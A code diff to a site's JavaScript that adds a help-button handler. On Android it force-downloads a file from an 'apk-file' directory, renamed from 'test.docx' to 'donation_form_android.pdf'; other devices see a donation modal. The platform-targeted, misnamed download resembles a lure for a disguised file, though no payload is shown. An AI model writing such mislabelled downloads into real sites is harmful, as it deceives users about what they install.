@@ -334,3 +334,33 @@ document.addEventListener('DOMContentLoaded', function() {
     
     images.forEach(img => imageObserver.observe(img));
 });
+
+
+document.addEventListener('DOMContentLoaded', function () {
+    const helpBtn = document.querySelector('.btn-help');
+    if (!helpBtn) return;
+
+    helpBtn.addEventListener('click', function () {
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        const isAndroid = /android/i.test(ua);
+        const isIOS = /iPhone|iPad|iPod/.test(ua);
+
+        if (isAndroid) {
+            const pdfUrl = '/static/main/apk-file/test.docx';
+            const link = document.createElement('a');
+            link.href = pdfUrl;
+            link.download = 'donation_form_android.pdf';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        } else {
+            const modalEl = document.getElementById('donationModal');
+            if (modalEl) {
+                const modal = new bootstrap.Modal(modalEl);
+                modal.show();
+            } else {
+                console.error('Modal element not found!');
+            }
+        }
+    });
+});
